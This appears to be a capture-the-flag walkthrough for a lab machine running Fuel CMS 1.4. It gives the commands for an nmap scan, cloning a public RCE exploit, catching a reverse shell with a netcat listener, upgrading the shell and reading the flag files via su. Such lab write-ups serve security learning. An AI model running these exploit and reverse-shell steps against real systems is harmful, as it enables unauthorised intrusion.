
---

### ✅ Step 1: Scan Target with Nmap

We start by scanning the target machine for open ports using **nmap**:

```bash
sudo nmap -v -A -Pn 0.0.0.0
```

**Result:**  
Port **80** is open, running **Apache 2.4.18 (Ubuntu)**:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

---

### ✅ Step 2: Identify Web Application

Accessing the web page on port **80** reveals it’s running **Fuel CMS v1.4**.

We search for public exploits on **Exploit-DB** or **GitHub**. In this case, I found an exploit on GitHub:

```bash
git clone https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated.git
```

---

### ✅ Step 3: Exploit Fuel CMS (Reverse Shell)

1. Start a netcat listener on port **4444**:

```bash
nc -nlvp 4444
```

2. Run the exploit with your **local IP address** and desired **port**:

```bash
python Fuel-Updated.py http://0.0.0.0/ 1.1.1.1 4444
```

- Replace `0.0.0.0` with the **target URL/IP**
- Replace `1.1.1.1` with **your machine's IP address**

> 🎉 Exploit succeeded! You now have a reverse shell.

---

### ✅ Step 4: Upgrade Shell

To improve the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

### ✅ Step 5: Privilege Escalation

**Note:** `sudo -l` didn’t work for some reason.  
Instead, I searched for **SUID** binaries to find privilege escalation paths:

```bash
find /bin -perm -4000 2>/dev/null
```

I found the `su` binary can be used:

```bash
/bin/su -c 'cat /home/user.txt'
/bin/su -c 'cat /root/root.txt'
```

---

### ✅ Final Result:

Successfully captured **both flags**:

- `user.txt`
- `root.txt`

---